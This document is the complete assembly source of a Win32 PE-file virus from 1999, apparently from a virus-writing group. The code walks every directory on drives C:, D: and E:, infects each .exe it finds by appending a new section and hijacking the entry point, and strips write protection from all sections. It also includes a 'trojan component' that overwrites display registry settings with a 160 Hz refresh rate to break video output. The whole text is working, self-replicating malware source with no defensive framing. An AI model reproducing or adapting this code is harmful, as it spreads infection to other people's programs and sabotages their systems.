   ; ================================ VIR32 ======================================
   ; Program       : Win32.Demo virus
   ; Description   : virus for PE-files (.exe)
   ; Last modified : 24.Apr.1999
   ; Purpose       : import implementation under win32
   ; Target OS     : Win95/98/NT
   ; Notes         :
   ; TODO          : Test for already infected

   .386
   .model flat,stdcall
   include win.inc

   virRVA = 2000h   ; if compiled with TASM 5.0 - for first virus starting
   virVA  = 400000h ; if compiled with TASM 5.0 - required for correctly
                   ; starting fisrt host program only

   .data   ; virus code will be modified

           org 0 ; hmmm... i couldn't remember, why have i typed this?
                   ; maybe there were some reasons (?)


   start:  nop     ; do you know, why my win32 asm progs start with NOP ?

   ; ========= set edi=program_image_Virtual_Address, ebp=virus_offset_RVA =======
           call $+5
   N1:     pop ebp
           mov edi,ebp
           sub ebp,offset N1
           sub edi,LARGE virRVA
   oldRVA  equ $-4 ; an RVA of new PE section will be stored there
           sub edi,N1-start ; so we'll get VA of loaded program,
                            ; usually it is 400000h, but not everywhere...
           mov dword ptr [ebp+ourebp],ebp
   ; ======= making own import =============
           lea ebx,[ebp+ImpAdr]
           lea esi,[ebp+Import-1]
   im1:    inc esi
           cmp byte ptr [esi],0
           jz short MyImpDone
           call [ebp+_LoadLibraryA],esi
   im2:    inc esi
           cmp byte ptr [esi],0
           jnz short im2
           inc esi
           cmp byte ptr [esi],0
           jz short im1
           push eax
           call [ebp+_GetProcAddress],eax,esi
           mov [ebx],eax
           pop eax
           add ebx,4
           jmp short im2
   MyImpDone:
   ; ========= making import for program ===============
           mov esi,LARGE 0 ; 4 bytes must be reserved there!
   oldIMP  equ $-4 ; program import directory (RVA)
           test esi,esi    ; it is very strange, if program have no import,
           jz short ExtImpDone ; but we'll check it too...
   imploop:mov eax,[edi+esi+0ch]
           test eax,eax
           jz short ExtImpDone
           add eax,edi
           mov ebx,[eax] ; loading page from virtual memory,
                         ; LoadLibrary fails, if page not present
           call [ebp+_LoadLibraryA],eax
   ;               test eax,eax
   ;               jz short imperror
           mov ebx,[edi+esi]
           mov ecx,[edi+esi+10h]
           add esi,14h
           test ebx,ebx    ; second type of export! read article!
           jnz short lookupok
           mov ebx,ecx
   lookupok:
           mov edx,[edi+ebx]
           add ebx,4
           test edx,edx
           jz short imploop
           test edx,80000000h
           jz short impname ; make import by name
           movzx edx,dx
           jmp short import1 ; make import by ordinal
   impname:lea edx,[edi+edx+2]
   import1:push eax ecx
           call [ebp+_GetProcAddress],eax,edx
           pop ecx
   ;               test eax,eax
   ;               jz short imperror
           mov [edi+ecx],eax
           pop eax
           add ecx,4
           jmp short lookupok
   ;imperror:
   ;               lea ecx,[ebp+ERROR1]
   ;               lea eax,[ebp+ERROR2]
   ;               call [ebp+_MessageBoxA],0,ecx,eax,0
   ;               jmp [ebp+_ExitProcess]
   ExtImpDone:
   ; ========= Starting virus thread ===============


           lea eax,[ebp+ThreadProc]
           lea ebx,[ebp+len1] ; thread ID will be lost
           call [ebp+_CreateThread],0,1024,eax,0,0,ebx

           lea eax,[edi+host-virVA] ; restore old entry
   oldENT  equ $-4 ; entrypoint RVA of host program
           jmp eax ; return to host

   ThreadProc:
           mov ebp,12345678h
   ourebp  equ $-4

           mov eax,'\:D'   ; scan disk D:
           call DiskScan
           mov eax,'\:E'   ; scan disk E:
           call DiskScan
           mov eax,'\:C'   ; scan disk C:
           call DiskScan

           call CheckTime


           jmp [ebp+_ExitThread]

   ; ==== It is a recursive function for scanning directory tree ====
   DiskScan:
           mov dword ptr [CurName],eax
   Search: lea ebx,[ebp+CurName]
           mov edi,ebx
   ss1:    inc edi
           test byte ptr [edi],0ffh
           jnz short ss1
           mov dword ptr [edi],'*.*' ; strcat(path,"*.*\0");
           lea eax,[ebp+FindData]
           call [ebp+_FindFirstFileA],ebx,eax
           mov esi,eax
           inc eax
           jz return
   ssagain:
                   ; some delay for scanning, sti/hlt can't be used :( on NT
           mov ebx,06666h
   sdelay: mul [bignum]
           dec ebx
           jnz short sdelay

           lea ebx,[ebp+cFileName]
           push edi esi
           cmp byte ptr [ebx],'.'
           jz next ; skip "." and ".." directories
   copy1:  mov al,byte ptr [ebx]
           inc ebx
           mov byte ptr [edi],al
           inc edi
           test al,al
           jnz short copy1
           test byte ptr [ebp+FindData],10h ; check directory flag
           jz short file
   ; ========= HANDLING DIRECTORY ============
           mov word ptr [edi-1],'\'
           call Search
           jmp next
   ; ============= HANDLING FILE =============
   file:   mov eax,[edi-5]
           or eax,20202000h ; convert extension to lower case
           cmp eax,'exe.'  ; infect only .exe files
           jnz next
   ; ================= FILE INFECTION ROUTINE ===================
           lea eax,[ebp+CurName]
           call [ebp+_CreateFileA],eax,GENERIC_READ or GENERIC_WRITE,0,0,OPEN_EXISTING,0,0
           mov [ebp+handle],eax
           inc eax
           jz error
           dec eax
           lea edx,[bufHDR+ebp]
           lea ecx,[len1+ebp]
                   ; read MZ-header
           call [ebp+_ReadFile],eax,edx,40h,ecx,0
           cmp word ptr [ebp+bufHDR], 'ZM' ; MZ
           jnz error
           cmp [ebp+bufHDR+18h],40h
           jb error
           mov edx,dword ptr [ebp+bufHDR+3ch]      ; start of PE header in file
           mov [ebp+filePE],edx
           call [ebp+_SetFilePointer],[ebp+handle],edx,0,FILE_BEGIN
           lea ecx,[len1+ebp]
           lea edx,[bufHDR+ebp]
                   ; read PE-header
           call [ebp+_ReadFile],[ebp+handle],edx,100h,ecx, 0
           cmp dword ptr [ebp+bufHDR],'EP' ; PE
           jnz error
           lea ebx,[ebp+bufHDR+8]
           mov al,53h
           cmp [ebx],al
           jz error ; already infected
           mov [ebx],al ; set infection flag
           mov dword ptr [ebp+bufHDR+58h],0        ; zero checksum
                   ; store old RVAs
           mov eax,dword ptr [ebp+bufHDR+28h]
           mov ebx,dword ptr [ebp+bufHDR+50h] ; image size
           mov dword ptr [ebp+oldRVA],ebx  ; store rva of new object
           mov dword ptr [ebp+oldENT],eax  ; store entry_RVA
           mov eax,dword ptr [ebp+bufHDR+80h]
           mov dword ptr [ebp+oldIMP],eax
                   ; calculate RVA of new object
           mov dword ptr [ebp+oneobj+0ch],ebx              ; RVA of new object
           mov dword ptr [ebp+bufHDR+28h],ebx      ; new entry
           lea eax,[ebx+Newimpdir-start]
           mov dword ptr [ebp+bufHDR+80h],eax      ; new imports
                   ; make import directory
           lea eax,[ebx+a1-start]
           mov [ebp+lpA1],eax
           lea eax,[ebx+_LoadLibraryA-start]
           mov [ebp+lp_GMH],eax
           mov [ebp+lpGMH],eax
           xor eax,eax
           mov [ebp+lpGMH+4],eax
           dec eax
           mov [ebp+lpGMH+8],eax
           lea eax,[ebx+a3-start]
           mov [ebp+_LoadLibraryA],eax
           lea eax,[ebx+a4-start]
           mov [ebp+_GetProcAddress],eax
                   ; Write section to file
           call [ebp+_SetFilePointer],[ebp+handle],0,0,FILE_END
           call FileAlign
           mov dword ptr [ebp+oneobj+14h],eax
                   ; set file pointer to end of file + file_align
           call [ebp+_SetFilePointer],[ebp+handle],eax,0,FILE_BEGIN
           mov eax,virend-start
           mov ebx,eax
           call FileAlign
           mov dword ptr [ebp+oneobj+10h],eax
           xchg eax,ebx    ; now ebx = FileAligned length, eax = length
           call ObjectAlign
           mov dword ptr [ebp+oneobj+8h],eax
           add dword ptr [ebp+bufHDR+50h],eax      ; update image size
           lea edx,[ebp+start]
                   ; write new section to the end of file
                   ; there is no need to align section - if section is smaller,
                   ; then only part before EOF will be loaded
           lea ecx,[ebp+len1]
           call [ebp+_WriteFile],[ebp+handle],edx,ebx,ecx,0

           inc word ptr [ebp+bufHDR+6] ; inc number of objects
                   ; write updated PE-header
           call [ebp+_SetFilePointer],[ebp+handle],[ebp+filePE],0,FILE_BEGIN
           lea edx,[ebp+bufHDR]
           lea ecx,[ebp+len1]
           call [ebp+_WriteFile],[ebp+handle],edx,100h,ecx,0
                   ; find place for last object
           movzx eax,[ebp+bufHDR+14h]
           add eax,[ebp+filePE]
           add eax,18h-28h ; -28 => to perfom loop with add eax,28 in it's start
                           ; now eax = offset of first object record
           movzx ecx,word ptr [ebp+bufHDR+6]
           lea edi,[ebp+objbuf]
           lea esi,[ebp+len1]
           ; we'll clear write protection from all sections of file (see article)
   unprot: jecxz unpdone
           push ecx
           add eax,28h
           push eax
           call [ebp+_SetFilePointer],[ebp+handle],eax,0,FILE_BEGIN
           call [ebp+_ReadFile],[ebp+handle],edi,28h,esi,0
           pop eax
           or dword ptr [edi+24h],0c0000000h ; set READ and WRITE flags
           push eax
           call [ebp+_SetFilePointer],[ebp+handle],eax,0,FILE_BEGIN
           call [ebp+_WriteFile],[ebp+handle],edi,28h,esi,0
           pop eax ecx
           loop unprot
   unpdone:
                   ; Write new object record to sections table
           call [ebp+_SetFilePointer],[ebp+handle],eax,0,FILE_BEGIN
           lea edx,[ebp+oneobj]
           lea ecx,[ebp+len1]
           call [ebp+_WriteFile],[ebp+handle],edx,28h,ecx,0

   error:  call [ebp+_CloseHandle],[ebp+handle]
   ; ===================== END OF FILE INFECTOR ==================


   next:   pop esi edi
           lea eax,[ebp+FindData]
           call [ebp+_FindNextFileA],esi,eax
           test eax,eax
           jnz ssagain
   return: mov byte ptr [edi],al ; eax==0
           call [ebp+_CloseHandle],esi
   retptr: ret

   ; ==== Align address to file align ================
   ;  in: eax=address; out: eax=new address
   FileAlign:
           mov ecx,dword ptr [ebp+bufHDR+3ch]
           jmp short Align1
   ObjectAlign:
           mov ecx,dword ptr [ebp+bufHDR+38h]
   Align1: dec eax
           xor edx,edx
           div ecx
           inc eax
           mul ecx
           ret

   ; ========================== TROJAN COMPONENT =======================
   CheckTime:
           ; actually, i don't want to check time, i want to kill video now!

           lea edi,[ebp+buf]
           mov byte ptr [edi],'0'
   regscan:        ; loop to enumerate all video devices
           lea esi,[ebp+modes]
           mov dword ptr [esi],'\61' ; 16-bit modes
           mov cl,3
           call scan1
           mov dword ptr [esi],'\23' ; 32-bit modes
           mov cl,3
           call scan1
           mov word ptr [esi],'\8' ; 8-bit modes
           mov cl,2
           call scan1
           mov dword ptr [esi],'\42' ; 24-bit
           mov cl,3
           call scan1
           mov dword ptr [esi],'\46' ; 64-bit - maybe they appared in future :)
           mov cl,3
           call scan1
           inc byte ptr [edi]
           cmp byte ptr [edi],'9'
           jnz short regscan
           ret

   scan1:  movzx ecx,cl
           push esi
           add esi,ecx
           mov dword ptr [esi],',046'
           mov dword ptr [esi+4],'084' ; <- 640x480
           call Trash
           mov dword ptr [esi],',008'
           mov dword ptr [esi+4],'006' ; <- 800x600
           call Trash
           mov dword ptr [esi],'4201'
           mov dword ptr [esi+4],'867,' ; <- 1024x768
           mov byte ptr [esi+8],0
           call Trash
           mov dword ptr [esi],'2511'
           mov dword ptr [esi+4],'468,' ; <- 1152x864
           mov byte ptr [esi+8],0
           call Trash
           mov dword ptr [esi],'0821'
           mov dword ptr [esi+4],'201,' ; <- 1280x1024
           mov word ptr [esi+8],'4'
           call Trash
           mov dword ptr [esi],'0061'
           mov dword ptr [esi+4],'021,' ; <- 1600x1200
           mov word ptr [esi+8],'0'
           call Trash
           pop esi
           ret

   Trash:          ; change registry key

           lea eax,[ebp+displ]
           lea edx,[ebp+dispkey]
           call [ebp+_RegOpenKeyExA],HKEY_LOCAL_MACHINE,eax,0,KEY_ALL_ACCESS,edx
           test eax,eax
           jnz short retp1
                   ; smash 'default' value
           lea eax,[ebp+Hz]
           call [ebp+_RegSetValueExA],[ebp+dispkey],0,0,REG_SZ,eax,endHz-Hz
                   ; smash 'RefreshRate' value
           lea eax,[ebp+Hz]
           lea edx,[ebp+Rate]
           call [ebp+_RegSetValueExA],[ebp+dispkey],edx,0,REG_SZ,eax,endHz-Hz
   retp1:  ret     ; better prev. call replace to jump, but i don't want to
                   ; push parameters by myself

   Hz      db '160',0
   endHz   label
   Rate    db 'RefreshRate',0

   displ   db 'System\CurrentControlSet\Services\Class\Display\000'
   buf     db '0\MODES\'
   modes   db 10 dup (0)
   ;------------------------------------------ Video trasher end ---------------

   ; ===================== DATA SECTION =============================

   ; ---------- import table for program --------------
   Import  db                                      'KERNEL32.dll',0
           db 'SetFilePointer',0
           db 'CreateFileA',0
           db 'ReadFile',0
           db 'WriteFile',0
           db 'FindFirstFileA',0
           db 'FindNextFileA',0
           db 'CloseHandle',0
           db 'CreateThread',0
           db 'ExitThread',0
           db 'ExitProcess',0,0
           db                                      'USER32.dll',0
           db 'MessageBoxA',0,0
           db                                      'ADVAPI32.dll',0
           db 'RegOpenKeyExA',0
           db 'RegSetValueExA',0,0
           db 0
   ImpAdr:
                                   ; KERNEL32
   _SetFilePointer dd 0
   _CreateFileA    dd 0
   _ReadFile       dd 0
   _WriteFile      dd 0
   _FindFirstFileA dd 0
   _FindNextFileA  dd 0
   _CloseHandle    dd 0
   _CreateThread   dd 0
   _ExitThread     dd 0
   _ExitProcess    dd 0
                                   ; USER32
   _MessageBoxA    dd 0
                                   ; ADVAPI32
   _RegOpenKeyExA  dd 0
   _RegSetValueExA dd 0

   ; -------- import table for OS loader ---------------
           @dwordalign start,0
   Newimpdir:
           extrn LoadLibraryA:PROC
           extrn GetProcAddress:PROC
   lpGMH           dd offset _LoadLibraryA,0,-1
   lpA1            dd offset a1
   lp_GMH          dd offset _LoadLibraryA,14h dup(0)
   a1              db 'KERNEL32.dll',0,0
   _LoadLibraryA   dd offset LoadLibraryA     ; offset a3
   _GetProcAddress dd offset GetProcAddress,0 ; offset a4,0

                   ; aligning...
           @wordalign start,0
   a3              db 1,0,'LoadLibraryA',0
           @wordalign start,0
   a4              db 2,0,'GetProcAddress',0,0

   ; ================ END OF IMPORT SECTION ==============

   bignum  dd 7fffffffh
   ;ERROR1 db 'Can''t perform import',0
   ;ERROR2 db 'SMT''s PE-sticker',0

   len1            dd ?    ; number of actually read/written bytes in IO operations
   dispkey         equ len1
   handle          dd 0    ; handle of opened file
   filePE          dd 0    ; position of PE header in file
   ; --------------------------- New PE-object
   oneobj          db '.vir32**'
                   dd 7 dup (0),0E0000020h ; buffer for one object and flags
   ; ---------------------------
   bufHDR          db 100h dup (0) ; for MZ/PE header
   objbuf          db 28h dup(0)

   buffer          label   ; 128-byte LZ-buffer in same place with search record
   FindData        label   ; search record
   dwFileAttributes        dd ?
   ftCreationTime          dq ?
   ftLastAccessTime        dq ?
   ftLastWriteTime         dq ?
   nFileSizeHigh           dd ?
   nFileSizeLow            dd ?
   dwReserved0             dd ?
   dwReserved1             dd ?
   cFileName               db MAX_PATH dup (?)
   cAlternateFileName      db 14 dup (?)
                   ; end of search record

   ; Starting directory:
   ;CurName                db 'c:\temp\test\'
   CurName         db '!', 512 dup (0)

   virend  label   ; end of virus code

   ; =================== HOST CODE SECTION ===================================
   .code   ; section only for stupid TASM
           db 'this line will be only in installer(dropper)',0
   hostmsg db 'Another product ran away from SMF team ;)',0
   title_  db 'Host started... Background thread scans directories now',0

           extrn MessageBoxA:PROC
           extrn ExitProcess:PROC
   host:   call MessageBoxA,0,offset hostmsg,offset title_,0
           jmp ExitProcess

           end start
